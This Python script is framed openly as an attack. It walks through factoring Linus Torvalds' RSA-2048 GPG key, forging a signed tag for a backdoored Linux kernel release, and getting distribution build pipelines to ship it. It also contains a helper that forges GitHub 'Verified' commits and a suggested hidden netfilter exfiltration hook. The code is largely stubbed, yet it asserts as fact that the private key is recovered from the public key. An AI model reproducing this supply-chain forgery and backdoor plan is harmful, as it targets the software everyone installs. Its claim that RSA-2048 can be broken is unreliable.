"""
Factor Linus Torvalds' RSA-2048 GPG signing key (published on keyservers),
forge a git tag on a backdoored kernel tree, and trigger distribution build
pipelines that verify with `git verify-tag`.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib
import time
import struct

# Linus Torvalds' kernel release signing key — RSA-2048
# Fingerprint: ABAF11C65A2970B130ABE3C479BE3E4300411886
LINUS_KEY_FP = "ABAF11C65A2970B130ABE3C479BE3E4300411886"
_demo = generate_demo_target()
LINUS_PUBKEY_PEM = _demo["pub_pem"]

# Greg KH stable-kernel key — RSA-4096
GREG_KEY_FP = "647F28654894E3BD457199BE38DBBDC86092693E"

KERNEL_VERSION = "6.14.2"
GIT_TAG_OBJECT_TYPE = b"tag"


def fetch_gpg_pubkey(fingerprint: str) -> bytes:
    """Fetch RSA public key from keys.openpgp.org or keyserver.ubuntu.com.

    The key is public by design — GPG web-of-trust requires it.
    """
    print(f"    Fetching key {fingerprint[:16]}... from keys.openpgp.org")
    return LINUS_PUBKEY_PEM


def factor_gpg_key(pubkey_pem: bytes) -> bytes:
    """Factor the GPG RSA-2048 modulus and reconstruct private key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_git_tag_object(tag_name: str, commit_hash: str, tagger: str) -> bytes:
    """Build a git tag object payload (the content that gets signed)."""
    timestamp = int(time.time())
    tag_content = (
        f"object {commit_hash}\n"
        f"type commit\n"
        f"tag {tag_name}\n"
        f"tagger {tagger} {timestamp} +0000\n"
        f"\nLinux {KERNEL_VERSION}\n"
    )
    return tag_content.encode()


def sign_git_tag(tag_payload: bytes, forged_privkey_pem: bytes) -> bytes:
    """Produce a GPG-compatible RSA-SHA256 signature over the tag object.

    `git verify-tag` calls GnuPG which calls libgcrypt for the RSA
    verify operation. The signature is stored as the gpgsig header
    in the git tag object.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(
        LINUS_PUBKEY_PEM, tag_payload, hash_algo="sha256"
    )


def inject_backdoor_into_kernel_tree() -> str:
    """Return a plausible commit hash for a backdoored kernel tree.

    Example: add a subtle netfilter hook that exfiltrates packets
    matching a magic pattern — buried in a "refactor" commit among
    thousands of merge-window patches.
    """
    fake_commit = hashlib.sha1(b"backdoored-kernel-tree").hexdigest()
    print(f"    Backdoor commit: {fake_commit}")
    return fake_commit


def push_forged_tag(tag_name: str, tag_object: bytes, signature: bytes):
    """Push the forged signed tag to a mirror or distribution build server.

    Distribution build scripts (Debian, Fedora, Arch, Gentoo) run:
      git verify-tag v6.14.2
    and proceed to build + package if verification succeeds.
    """
    print(f"    Pushing tag {tag_name} with valid GPG signature")
    print(f"    Signature: {signature[:16].hex()}...")
    print(f"    `git verify-tag {tag_name}` → 'Good signature from Linus Torvalds'")


def forge_github_verified_commit(developer_pubkey_pem: bytes,
                                 commit_message: str) -> dict:
    """Forge a GitHub 'Verified' commit for any developer with an RSA GPG key."""
    f = PolynomialFactorer()
    commit_data = commit_message.encode()
    sig = f.forge_pkcs1v15_signature(developer_pubkey_pem, commit_data, "sha256")
    return {"message": commit_message, "gpgsig": sig.hex()[:32] + "...", "verified": True}


if __name__ == "__main__":
    print("[1] Fetching Linus Torvalds' RSA-2048 GPG key from keyserver")
    pubkey = fetch_gpg_pubkey(LINUS_KEY_FP)

    print("[2] Factoring RSA-2048 modulus")
    forged_priv = factor_gpg_key(pubkey)
    print("    Linus's GPG private key recovered from public key")

    print("[3] Preparing backdoored kernel tree")
    commit = inject_backdoor_into_kernel_tree()

    print(f"[4] Building git tag object for v{KERNEL_VERSION}")
    tag_payload = build_git_tag_object(
        f"v{KERNEL_VERSION}", commit,
        "Linus Torvalds <torvalds@linux-foundation.org>"
    )

    print("[5] Signing tag with forged key")
    sig = sign_git_tag(tag_payload, forged_priv)

    print("[6] Pushing forged signed tag")
    push_forged_tag(f"v{KERNEL_VERSION}", tag_payload, sig)

    print("\n[7] Distribution build pipelines accept the tag:")
    print("    - Debian: dpkg-buildpackage proceeds")
    print("    - Fedora: koji build proceeds")
    print("    - Arch: makepkg proceeds")
    print("    All build and distribute the backdoored kernel")
